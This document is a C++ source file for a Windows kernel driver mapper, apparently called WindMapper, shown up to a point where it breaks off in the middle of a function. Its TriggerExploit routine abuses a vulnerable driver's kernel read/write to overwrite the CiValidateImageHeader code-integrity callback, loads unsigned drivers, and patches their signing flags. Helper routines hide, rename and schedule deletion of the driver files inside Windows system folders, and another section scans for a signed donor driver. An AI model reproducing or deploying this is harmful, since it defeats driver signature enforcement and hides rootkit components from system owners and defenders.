
#include "Mapper.h"
#include "EmbeddedDriver.h"
#include <Shlwapi.h>
#include <cstdio>
#include <cstdarg>
#include <cstring>
#include <tlhelp32.h>
#include <string>
#include <initguid.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>
#include <io.h>

// ============ DEBUG LOGGING ============
FILE* g_LogFile = nullptr;

void FlushMapperLogFile() {
    if (!g_LogFile) {
        return;
    }

    fflush(g_LogFile);
    intptr_t osHandle = _get_osfhandle(_fileno(g_LogFile));
    if (osHandle != -1) {
        FlushFileBuffers(reinterpret_cast<HANDLE>(osHandle));
    }
}

static void DbgLog(const char* func, const char* fmt, ...) {
    char buf[2048];
    va_list args;
    va_start(args, fmt);

    int prefixLen = snprintf(buf, sizeof(buf), "[WindMapper][%s] ", func);
    if (prefixLen < 0) prefixLen = 0;
    vsnprintf(buf + prefixLen, sizeof(buf) - prefixLen, fmt, args);
    va_end(args);

    // Console
    printf("%s\n", buf);
    fflush(stdout);

    // Debug output (visible in WinDbg/DebugView)
    OutputDebugStringA(buf);
    OutputDebugStringA("\n");

    // File log
    if (g_LogFile) {
        fprintf(g_LogFile, "%s\n", buf);
        FlushMapperLogFile();
    }
}

#define LOG(fmt, ...) DbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
#define LOG_STATUS(msg, st) DbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")
// ============ END DEBUG LOGGING ============

static void OpenMapperLog()
{
    char logPath[MAX_PATH] = {};
    DWORD envLen = GetEnvironmentVariableA("AIDA_MAPPER_LOG", logPath, static_cast<DWORD>(sizeof(logPath)));
    if (envLen > 0 && envLen < sizeof(logPath)) {
        fopen_s(&g_LogFile, logPath, "w");
        if (g_LogFile) {
            setvbuf(g_LogFile, nullptr, _IONBF, 0);
        }
    }

    if (!g_LogFile) {
        char exePath[MAX_PATH] = {};
        DWORD got = GetModuleFileNameA(nullptr, exePath, MAX_PATH);
        if (got > 0 && got < MAX_PATH) {
            char* lastSlash = std::strrchr(exePath, '\\');
            if (lastSlash) {
                *(lastSlash + 1) = '\0';
                strncat_s(exePath, sizeof(exePath), "WindMapper_debug.log", _TRUNCATE);
                fopen_s(&g_LogFile, exePath, "w");
                if (g_LogFile) {
                    setvbuf(g_LogFile, nullptr, _IONBF, 0);
                }
            }
        }
    }

    if (!g_LogFile) {
        fopen_s(&g_LogFile, "C:\\WindMapper_debug.log", "w");
        if (g_LogFile) {
            setvbuf(g_LogFile, nullptr, _IONBF, 0);
        }
    }

    if (!g_LogFile) {
        OutputDebugStringA("[WindMapper][OpenMapperLog] failed to open file log\n");
    }
}

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wintrust.lib")

namespace Utils {

    std::wstring GenerateRandomName(size_t length) {
        static const wchar_t charset[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dist(0, static_cast<int>(wcslen(charset) - 1));

        std::wstring result;
        result.reserve(length);

        for (size_t i = 0; i < length; i++) {
            result += charset[dist(gen)];
        }

        return result;
    }

    BOOL InitializeNtFunctions() {
        LOG("Resolving ntdll function pointers...");
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            ntdll = LoadLibraryW(L"ntdll.dll");
            if (!ntdll) {
                LOG("FATAL: Failed to load ntdll.dll, GLE=%u", GetLastError());
                return FALSE;
            }
        }
        LOG("ntdll.dll base: %p", ntdll);

        NtQuerySystemInformationPtr = reinterpret_cast<pNtQuerySystemInformation>(
            GetProcAddress(ntdll, "NtQuerySystemInformation")
        );

        NtLoadDriverPtr = reinterpret_cast<pNtLoadDriver>(
            GetProcAddress(ntdll, "NtLoadDriver")
        );

        NtUnloadDriverPtr = reinterpret_cast<pNtUnloadDriver>(
            GetProcAddress(ntdll, "NtUnloadDriver")
        );

        RtlAdjustPrivilegePtr = reinterpret_cast<pRtlAdjustPrivilege>(
            GetProcAddress(ntdll, "RtlAdjustPrivilege")
        );

        RtlGetFullPathName_UExPtr = reinterpret_cast<pRtlGetFullPathName_UEx>(
            GetProcAddress(ntdll, "RtlGetFullPathName_UEx")
        );

        RtlCreateRegistryKeyPtr = reinterpret_cast<pRtlCreateRegistryKey>(
            GetProcAddress(ntdll, "RtlCreateRegistryKey")
        );

        RtlWriteRegistryValuePtr = reinterpret_cast<pRtlWriteRegistryValue>(
            GetProcAddress(ntdll, "RtlWriteRegistryValue")
        );

        NtDeviceIoControlFilePtr = reinterpret_cast<pNtDeviceIoControlFile>(
            GetProcAddress(ntdll, "NtDeviceIoControlFile")
        );

        NtDeleteKeyPtr = reinterpret_cast<pNtDeleteKey>(
            GetProcAddress(ntdll, "NtDeleteKey")
        );

        NtOpenKeyPtr = reinterpret_cast<pNtOpenKey>(
            GetProcAddress(ntdll, "NtOpenKey")
        );

        NtFlushKeyPtr = reinterpret_cast<pNtFlushKey>(
            GetProcAddress(ntdll, "NtFlushKey")
        );


        NtCreateFilePtr = reinterpret_cast<pNtCreateFile>(
            GetProcAddress(ntdll, "NtCreateFile")
        );
        NtSetInformationFilePtr = reinterpret_cast<pNtSetInformationFile>(
            GetProcAddress(ntdll, "NtSetInformationFile")
        );

        BOOL result = NtQuerySystemInformationPtr && NtLoadDriverPtr &&
               NtUnloadDriverPtr && RtlAdjustPrivilegePtr &&
               RtlGetFullPathName_UExPtr && RtlCreateRegistryKeyPtr &&
               RtlWriteRegistryValuePtr && NtDeviceIoControlFilePtr;

        LOG("NtQuerySystemInformation: %p", NtQuerySystemInformationPtr);
        LOG("NtLoadDriver: %p", NtLoadDriverPtr);
        LOG("NtUnloadDriver: %p", NtUnloadDriverPtr);
        LOG("RtlAdjustPrivilege: %p", RtlAdjustPrivilegePtr);
        LOG("NtDeviceIoControlFile: %p", NtDeviceIoControlFilePtr);
        LOG("NtDeleteKey: %p, NtOpenKey: %p, NtFlushKey: %p", NtDeleteKeyPtr, NtOpenKeyPtr, NtFlushKeyPtr);
        LOG("NtCreateFile: %p, NtSetInformationFile: %p", NtCreateFilePtr, NtSetInformationFilePtr);
        LOG("InitializeNtFunctions result: %s", result ? "OK" : "FAILED (missing critical functions)");
        return result;
    }

    NTSTATUS AdjustPrivilege(ULONG privilege, BOOLEAN enable) {
        BOOLEAN wasEnabled;
        return RtlAdjustPrivilegePtr(privilege, enable, FALSE, &wasEnabled);
    }

    NTSTATUS GetFullPath(PCWSTR fileName, PWSTR buffer, ULONG bufferLength) {
        return RtlGetFullPathName_UExPtr(fileName, bufferLength, buffer, nullptr, nullptr);
    }

    BOOL SecureDeleteFile(PCWSTR filePath) {
        HANDLE hFile = CreateFileW(
            filePath,
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 0) {
                DWORD chunkSize = 4096;
                BYTE zeroBuffer[4096];
                SecureZeroMemory(zeroBuffer, sizeof(zeroBuffer));

                SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
                LONGLONG remaining = fileSize.QuadPart;
                while (remaining > 0) {
                    DWORD toWrite = static_cast<DWORD>(min(static_cast<LONGLONG>(chunkSize), remaining));
                    DWORD written = 0;
                    WriteFile(hFile, zeroBuffer, toWrite, &written, nullptr);
                    remaining -= written;
                    if (written == 0) break;
                }
                FlushFileBuffers(hFile);
            }
            CloseHandle(hFile);
        }

        SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileW(filePath);
    }


    BOOL PosixDeleteFile(PCWSTR filePath) {
        if (!filePath || !NtCreateFilePtr || !NtSetInformationFilePtr)
            return FALSE;


        WCHAR ntPath[520] = {};
        wcscpy_s(ntPath, L"\\??\\");
        wcscat_s(ntPath, filePath);

        UNICODE_STRING uniPath;
        RtlInitUnicodeString(&uniPath, ntPath);

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &uniPath,
            OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};

        NTSTATUS status = NtCreateFilePtr(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0
        );

        if (!NT_SUCCESS(status))
            return FALSE;


        struct {
            ULONG Flags;
        } dispEx;
        dispEx.Flags = 0x1
                     | 0x2
                     | 0x10;

        status = NtSetInformationFilePtr(
            fileHandle, &ioStatus,
            &dispEx, sizeof(dispEx),
            static_cast<FILE_INFORMATION_CLASS>(64)
        );

        NtClose(fileHandle);
        return NT_SUCCESS(status);
    }


    std::wstring GetRandomSystemDirectory() {
        WCHAR winDir[MAX_PATH] = {};
        DWORD winLen = GetWindowsDirectoryW(winDir, MAX_PATH);
        if (winLen == 0 || winLen >= MAX_PATH)
            return L"";

        WCHAR programData[MAX_PATH] = {};
        DWORD pdLen = GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH);


        std::wstring candidates[12];
        int count = 0;


        candidates[count++] = std::wstring(winDir) + L"\\Temp";


        candidates[count++] = std::wstring(winDir) + L"\\SoftwareDistribution\\Download";


        candidates[count++] = std::wstring(winDir) + L"\\Prefetch";


        candidates[count++] = std::wstring(winDir) + L"\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp";


        candidates[count++] = std::wstring(winDir) + L"\\Logs\\MoSetup";


        candidates[count++] = std::wstring(winDir) + L"\\INF";

        if (pdLen > 0 && pdLen < MAX_PATH) {

            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Windows\\WER\\Temp";
            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Windows\\Caches";
            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Crypto\\RSA\\MachineKeys";
            candidates[count++] = std::wstring(programData) + L"\\USOShared\\Logs";
        }


        static std::mt19937 rng(static_cast<unsigned int>(__rdtsc()));
        for (int i = count - 1; i > 0; i--) {
            std::uniform_int_distribution<int> dist(0, i);
            int j = dist(rng);
            std::swap(candidates[i], candidates[j]);
        }

        for (int i = 0; i < count; i++) {
            DWORD attr = GetFileAttributesW(candidates[i].c_str());
            if (attr == INVALID_FILE_ATTRIBUTES)
                continue;
            if (!(attr & FILE_ATTRIBUTE_DIRECTORY))
                continue;


            std::wstring probe = candidates[i] + L"\\" + GenerateRandomName(8) + L".tmp";
            HANDLE hProbe = CreateFileW(probe.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
            if (hProbe != INVALID_HANDLE_VALUE) {
                CloseHandle(hProbe);
                return candidates[i];
            }
        }


        return std::wstring(winDir) + L"\\Temp";
    }

    BOOL ForceDeleteOrRename(PCWSTR filePath) {

        if (DeleteFileW(filePath)) {
            return TRUE;
        }


        if (PosixDeleteFile(filePath)) {
            return TRUE;
        }


        std::wstring hideDir = GetRandomSystemDirectory();
        if (!hideDir.empty()) {
            std::wstring newName = hideDir + L"\\" + GenerateRandomName(16) + L".tmp";
            if (MoveFileW(filePath, newName.c_str())) {
                SetFileAttributesW(newName.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
                MoveFileExW(newName.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                return TRUE;
            }
        }


        SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
        MoveFileExW(filePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        return FALSE;
    }

    BOOL HideLoadedImagePath(PCWSTR filePath) {
        if (!filePath || !filePath[0])
            return FALSE;

        DWORD attr = GetFileAttributesW(filePath);
        if (attr == INVALID_FILE_ATTRIBUTES) {
            DWORD gle = GetLastError();
            return gle == ERROR_FILE_NOT_FOUND || gle == ERROR_PATH_NOT_FOUND;
        }

        SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);

        std::wstring cleanupPath = filePath;
        PCWSTR lastSlash = wcsrchr(filePath, L'\\');
        if (lastSlash && lastSlash > filePath) {
            std::wstring dir(filePath, lastSlash - filePath);
            std::wstring renamePath = dir + L"\\" + GenerateRandomName(16) + L".tmp";
            if (MoveFileW(filePath, renamePath.c_str())) {
                cleanupPath = renamePath;
                SetFileAttributesW(cleanupPath.c_str(),
                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
            }
        }

        BOOL scheduled = MoveFileExW(cleanupPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        if (!scheduled) {
            SetFileAttributesW(cleanupPath.c_str(),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
        }

        return scheduled || cleanupPath != filePath;
    }

    std::wstring GetTempFilePath(PCWSTR extension) {
        std::wstring dir = GetRandomSystemDirectory();
        if (dir.empty())
            return L"";

        std::wstring name = GenerateRandomName(12);
        return dir + L"\\" + name + extension;
    }

    std::wstring GetSiblingTempFilePath(PCWSTR basePath, PCWSTR extension) {
        if (!basePath || !basePath[0])
            return GetTempFilePath(extension);

        PCWSTR slash = wcsrchr(basePath, L'\\');
        if (!slash || slash == basePath)
            return GetTempFilePath(extension);

        std::wstring dir(basePath, slash - basePath);
        if (dir.empty())
            return GetTempFilePath(extension);

        std::wstring probe = dir + L"\\" + GenerateRandomName(8) + L".tmp";
        HANDLE hProbe = CreateFileW(probe.c_str(), GENERIC_WRITE, 0, nullptr,
            CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
        if (hProbe == INVALID_HANDLE_VALUE)
            return GetTempFilePath(extension);

        CloseHandle(hProbe);
        return dir + L"\\" + GenerateRandomName(12) + extension;
    }


}

namespace MapperCore {

    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName,
                            PCWSTR shadowFsDriverFileName, PCWSTR targetDriverFullPath,
                            PCWSTR sentinelDriverFullPath, PCWSTR shadowFsDriverFullPath,
                            PCWSTR loaderDriverFullPath) {
        LOG("=== TriggerExploit START ===");
        LOG("Target driver: %ls", targetDriverFileName ? targetDriverFileName : L"(null)");
        LOG("Sentinel driver: %ls", sentinelDriverFileName ? sentinelDriverFileName : L"(null)");

        HANDLE deviceHandle = nullptr;
        NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);
        LOG_STATUS("OpenDevice (initial attempt)", status);

        if (!NT_SUCCESS(status)) {
            LOG("Device not open, loading vuln driver via service...");
            status = DriverLoader::LoadDriver(g_LoaderServicePath);
            LOG_STATUS("LoadDriver (vuln/loader)", status);

            if (!NT_SUCCESS(status) &&
                status != STATUS_OBJECT_NAME_COLLISION &&
                status != STATUS_IMAGE_ALREADY_LOADED) {
                LOG("FATAL: LoadDriver failed with non-recoverable status 0x%08X", (DWORD)status);
                return status;
            }
            LOG("Waiting for device to appear (retrying up to 10 times)...");
            for (int retry = 0; retry < 10; retry++) {
                Sleep(100);
                status = VulnDriver::OpenDevice(&deviceHandle);
                if (NT_SUCCESS(status)) {
                    LOG("Device opened on retry %d, handle=%p", retry, deviceHandle);
                    break;
                }
            }

            if (!NT_SUCCESS(status)) {
                LOG("FATAL: Device never appeared after 10 retries, status=0x%08X", (DWORD)status);
                return status;
            }
        } else {
            LOG("Device already open, handle=%p", deviceHandle);
        }
        {
            PVOID ciValidateImageHeaderEntry = nullptr;
            PVOID zwFlushInstructionCache = nullptr;

            LOG("Resolving CiValidateImageHeader entry and ZwFlushInstructionCache...");
            BOOL ciResult = KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache);
            LOG("GetCiValidateImageHeaderEntry: %s, entry=%p, zwFlush=%p", ciResult ? "TRUE" : "FALSE",
                ciValidateImageHeaderEntry, zwFlushInstructionCache);

            if (ciResult && ciValidateImageHeaderEntry && zwFlushInstructionCache) {

                PVOID originalCallback = nullptr;
                LOG("Reading original CI callback from kernel addr %p...", ciValidateImageHeaderEntry);
                status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                LOG_STATUS("ReadKernelMemory (original CI callback)", status);
                LOG("Original CI callback value: %p", originalCallback);

                if (NT_SUCCESS(status)) {
                    g_OriginalCiCallback = originalCallback;
                    g_CiCallbackAddress = ciValidateImageHeaderEntry;

                    LOG("Patching CI callback -> ZwFlushInstructionCache (%p)...", zwFlushInstructionCache);
                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
                    LOG_STATUS("WriteKernelMemory (CI patch)", status);

                    if (NT_SUCCESS(status)) {
                        g_CiCallbackPatched = true;
                        LOG("CI callback patched successfully, now loading target driver...");
                        LOG("Target driver service path: %ls", g_DriverServicePath);
                        status = DriverLoader::LoadDriver(g_DriverServicePath);
                        LOG_STATUS("LoadDriver (WhosWho/target)", status);
                        if (NT_SUCCESS(status) && targetDriverFullPath && targetDriverFullPath[0]) {
                            LOG("Hiding target driver file immediately after load: %ls", targetDriverFullPath);
                            if (Utils::HideLoadedImagePath(targetDriverFullPath)) {
                                LOG("Target driver file hidden/renamed after load");
                            } else {
                                LOG("WARNING: Target driver file hide deferred after load, GLE=%u", GetLastError());
                            }
                        }

                        NTSTATUS sentStatus = STATUS_SUCCESS;
                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            LOG("Loading sentinel driver, service path: %ls", g_SentinelServicePath);
                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                            LOG_STATUS("LoadDriver (Sentinel)", sentStatus);
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFullPath && sentinelDriverFullPath[0]) {
                                LOG("Hiding sentinel driver file immediately after load: %ls", sentinelDriverFullPath);
                                if (Utils::HideLoadedImagePath(sentinelDriverFullPath)) {
                                    LOG("Sentinel driver file hidden/renamed after load");
                                } else {
                                    LOG("WARNING: Sentinel driver file hide deferred after load, GLE=%u", GetLastError());
                                }
                            }
                            if (!NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
                                LOG("FATAL: Sentinel load is required and failed with status 0x%08X", (DWORD)sentStatus);
                            }
                        } else if (!NT_SUCCESS(status)) {
                            LOG("Skipping Sentinel load because target driver failed");
                        }

                        NTSTATUS shadowFsStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(status) && shadowFsDriverFileName && g_ShadowFsServicePath[0]) {
                            LOG("Loading shadowfs driver, service path: %ls", g_ShadowFsServicePath);
                            shadowFsStatus = DriverLoader::LoadDriver(g_ShadowFsServicePath);
                            LOG_STATUS("LoadDriver (ShadowFS)", shadowFsStatus);
                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFullPath && shadowFsDriverFullPath[0]) {
                                LOG("Hiding shadowfs driver file immediately after load: %ls", shadowFsDriverFullPath);
                                if (Utils::HideLoadedImagePath(shadowFsDriverFullPath)) {
                                    LOG("ShadowFS driver file hidden/renamed after load");
                                } else {
                                    LOG("WARNING: ShadowFS driver file hide deferred after load, GLE=%u", GetLastError());
                                }
                            }
                        } else if (!NT_SUCCESS(status)) {
                            LOG("Skipping ShadowFS load because target driver failed");
                        }

                        LOG("Restoring original CI callback %p...", originalCallback);
                        NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                        LOG_STATUS("WriteKernelMemory (CI restore)", restoreStatus);
                        g_CiCallbackPatched = false;

                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0] &&
                            !NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
                            status = sentStatus;
                        }

                        if (NT_SUCCESS(status)) {
                            LOG("Patching driver signing flags for target: %ls", targetDriverFileName);
                            BOOL patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
                            LOG("PatchDriverSigningFlags (target): %s", patchResult ? "OK" : "FAILED");

                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                LOG("Patching driver signing flags for sentinel: %ls", sentinelDriverFileName);
                                patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
                                LOG("PatchDriverSigningFlags (sentinel): %s", patchResult ? "OK" : "FAILED");
                            }

                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
                                LOG("Patching driver signing flags for shadowfs: %ls", shadowFsDriverFileName);
                                patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, shadowFsDriverFileName);
                                LOG("PatchDriverSigningFlags (shadowfs): %s", patchResult ? "OK" : "FAILED");
                            }
                        }
                    } else {
                        LOG("FATAL: Failed to write CI callback patch!");
                    }
                } else {
                    LOG("FATAL: Failed to read original CI callback!");
                }
            } else {
                LOG("FATAL: GetCiValidateImageHeaderEntry failed - cannot proceed with exploit");
                status = STATUS_NOT_FOUND;
            }
        }


        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
            LOG("--- WriteSentinelGlobals phase ---");
            ULONG sentImageSize = 0;
            PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
            LOG("Sentinel driver base: %p, size: 0x%X", sentBase, sentImageSize);
            if (sentBase) {
                g_SentinelLoadAddress = sentBase;
                g_SentinelImageSize = sentImageSize;
                ULONG whoswhoImageSize = 0;
                PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
                LOG("WhosWho driver base: %p, size: 0x%X", whoswhoBase, whoswhoImageSize);
                if (whoswhoBase) {
                    g_DriverLoadAddress = whoswhoBase;
                    BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
                                             whoswhoBase, whoswhoImageSize);
                    LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
                    if (!wsgResult) {
                        LOG("WriteSentinelGlobals failed; continuing because Sentinel performs in-driver bridge discovery");
                    }
                } else {
                    LOG("WARNING: Could not find WhosWho driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
                }
            } else {
                LOG("WARNING: Could not find Sentinel driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
            }
        }


        LOG("Closing vuln device and unloading loader driver...");
        VulnDriver::CloseDevice(deviceHandle);
        NTSTATUS unloadStatus = DriverLoader::UnloadDriver(g_LoaderServicePath);
        if (NT_SUCCESS(unloadStatus) && loaderDriverFullPath && loaderDriverFullPath[0]) {
            LOG("Deleting loader driver file immediately after unload: %ls", loaderDriverFullPath);
            if (Utils::ForceDeleteOrRename(loaderDriverFullPath)) {
                LOG("Loader driver file deleted/renamed immediately after unload");
            } else {
                LOG("WARNING: Loader driver file deletion deferred after unload, GLE=%u", GetLastError());
            }
        }

        LOG("=== TriggerExploit END, status=0x%08X ===", (DWORD)status);
        return status;
    }

    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath,
                            PCWSTR shadowFsPath) {
        LOG("=== WindLoadDriver START ===");
        LOG("loaderPath: %ls", loaderPath ? loaderPath : L"(null)");
        LOG("driverPath: %ls", driverPath ? driverPath : L"(null)");
        LOG("sentinelPath: %ls", sentinelPath ? sentinelPath : L"(null)");
        LOG("shadowFsPath: %ls", shadowFsPath ? shadowFsPath : L"(null)");

        NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        LOG_STATUS("AdjustPrivilege (SeLoadDriverPrivilege)", status);
        if (!NT_SUCCESS(status)) {
            LOG("FATAL: Cannot acquire SeLoadDriverPrivilege!");
            return status;
        }

        WCHAR loaderFullPath[520];
        status = Utils::GetFullPath(loaderPath, loaderFullPath, sizeof(loaderFullPath));
        LOG_STATUS("GetFullPath (loader)", status);
        if (!NT_SUCCESS(status)) {
            return status;
        }
        LOG("Loader full path: %ls", loaderFullPath);

        WCHAR driverFullPath[520];
        status = Utils::GetFullPath(driverPath, driverFullPath, sizeof(driverFullPath));
        LOG_STATUS("GetFullPath (driver)", status);
        if (!NT_SUCCESS(status)) {
            return status;
        }
        LOG("Driver full path: %ls", driverFullPath);

        status = DriverLoader::CreateDriverService(g_DriverServicePath, driverFullPath);
        LOG_STATUS("CreateDriverService (target driver)", status);
        LOG("Driver service path: %ls", g_DriverServicePath);
        if (!NT_SUCCESS(status)) {
            return status;
        }

        status = DriverLoader::CreateDriverService(g_LoaderServicePath, loaderFullPath);
        LOG_STATUS("CreateDriverService (loader)", status);
        LOG("Loader service path: %ls", g_LoaderServicePath);
        if (!NT_SUCCESS(status)) {
            return status;
        }


        WCHAR sentinelFullPath[520] = {};
        if (sentinelPath && sentinelPath[0]) {
            status = Utils::GetFullPath(sentinelPath, sentinelFullPath, sizeof(sentinelFullPath));
            LOG_STATUS("GetFullPath (sentinel)", status);
            if (!NT_SUCCESS(status)) {
                return status;
            }
            LOG("Sentinel full path: %ls", sentinelFullPath);
            status = DriverLoader::CreateDriverService(g_SentinelServicePath, sentinelFullPath);
            LOG_STATUS("CreateDriverService (sentinel)", status);
            LOG("Sentinel service path: %ls", g_SentinelServicePath);
            if (!NT_SUCCESS(status)) {
                return status;
            }
        }

        WCHAR shadowFsFullPath[520] = {};
        if (shadowFsPath && shadowFsPath[0]) {
            status = Utils::GetFullPath(shadowFsPath, shadowFsFullPath, sizeof(shadowFsFullPath));
            LOG_STATUS("GetFullPath (shadowfs)", status);
            if (!NT_SUCCESS(status)) {
                return status;
            }
            LOG("ShadowFS full path: %ls", shadowFsFullPath);
            status = DriverLoader::CreateMinifilterService(
                g_ShadowFsServicePath,
                shadowFsFullPath,
                L"AiDAShadowFS Instance",
                L"385701");
            LOG_STATUS("CreateMinifilterService (shadowfs)", status);
            LOG("ShadowFS service path: %ls", g_ShadowFsServicePath);
            if (!NT_SUCCESS(status)) {
                return status;
            }
        }

        WCHAR donorPath[MAX_PATH] = {};
        BOOL donorIsEV = FALSE;
        BOOL donorFound = FALSE;
        WCHAR donorCopyPath[520] = {};

        {


            WCHAR driversDir[MAX_PATH];
            GetSystemDirectoryW(driversDir, MAX_PATH);
            wcscat_s(driversDir, L"\\drivers");

            WIN32_FIND_DATAW fd;
            WCHAR searchPat[MAX_PATH];
            wcscpy_s(searchPat, driversDir);
            wcscat_s(searchPat, L"\\*.sys");
            HANDLE hFind = FindFirstFileW(searchPat, &fd);
            int bestScore = 0;
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    if (fd.nFileSizeLow < 8192) continue;
                    WCHAR fullPath[MAX_PATH];
                    wcscpy_s(fullPath, driversDir);
                    wcscat_s(fullPath, L"\\");
                    wcscat_s(fullPath, fd.cFileName);


                    HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
                    if (hf == INVALID_HANDLE_VALUE) continue;
                    BYTE hdr[4096];
                    DWORD br = 0;
                    BOOL readOk = ReadFile(hf, hdr, sizeof(hdr), &br, nullptr);
                    CloseHandle(hf);
                    if (!readOk || br < 512) continue;

                    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
                    if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
                    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br) continue;
                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(hdr + dos->e_lfanew);
                    if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
                    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) continue;
                    PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nt;
                    if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress == 0) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size < 128) continue;


                    WINTRUST_FILE_INFO wfi = {};
                    wfi.cbStruct = sizeof(wfi);
                    wfi.pcwszFilePath = fullPath;
                    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
                    WINTRUST_DATA wtd = {};
                    wtd.cbStruct = sizeof(wtd);
                    wtd.dwUIChoice = WTD_UI_NONE;
                    wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
                    wtd.dwUnionChoice = WTD_CHOICE_FILE;
                    wtd.pFile = &wfi;
